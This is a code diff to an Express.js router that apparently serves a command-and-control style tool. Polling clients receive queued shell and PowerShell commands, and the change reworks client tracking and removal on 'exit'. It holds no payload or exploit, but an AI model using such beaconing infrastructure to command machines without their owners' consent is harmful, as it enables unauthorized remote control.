@@ -1,14 +1,21 @@
 const router = require('express').Router();
 const Command = require('../commands.model');
-const Status = require('../../Status/status.model');
 const Utils = require('../../Utils/utilFunctions');
 const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
 const psCommand = require('../pscommand.model');
 const formidable = require('express-formidable');
+const Client = require('../../Clients/client.model')
 
 router.use(toolCookieValidator);
 
-
+const RemoveClient = (clientId) => {
+    Client.findOneAndDelete({client_id: clientId}, {}, function (err) {
+        if (err)
+            Utils.LogToFile(`Error removing client ${clientId}: ${err}`)
+        else
+            Utils.LogToFile(`Removed ${clientId} successfully!`)
+    })
+}
 //Give client a command + update check in
 router.route('/h2').get((req, res) => {
     try {
@@ -19,23 +26,17 @@ router.route('/h2').get((req, res) => {
                 res.send("No command");
             } else {
                 if (command) {
-                    res.send(command['command']);
+                    if (command['command'] === "exit")
+                        RemoveClient(clientId)
+                    res.send(command['command'])
                 } else {
                     res.send("No command");
                 }
-                //Update status
-                Status.findOneAndUpdate({client_id: clientId}, {
-                        status: true,
-                        lastActive: Utils.GetCurrentTimeDate()
-                    }, {useFindAndModify: false},
-                    function (err) {
-                        if (err) {
-                            Utils.LogToFile(`Error updating client ${clientId} status to DB`);
-                        } else {
-
-                        }
-                    })
             }
+            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
+                if (err)
+                    Utils.LogToFile(`Error updating last active for client ${clientId}`)
+            })
         })
     } catch (err) {
         Utils.LogToFile(`Error getting command for client ${err}`);
@@ -59,14 +60,11 @@ router.route('/ps').post((req, res) => {
                 } else {
                     res.send("No command");
                 }
-                //Update status
-                Status.findOneAndUpdate({client_id: clientId}, {status: true}, {useFindAndModify: false},
-                    function (err) {
-                        if (err) {
-                            Utils.LogToFile(`Error updating client ${clientId} status to DB`);
-                        }
-                    })
             }
+        })
+        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
+            if (err)
+                Utils.LogToFile(`Error updating last active for client ${clientId}`)
         })
     } catch (err) {
         Utils.LogToFile(`Error getting ps command for client ${err}`);
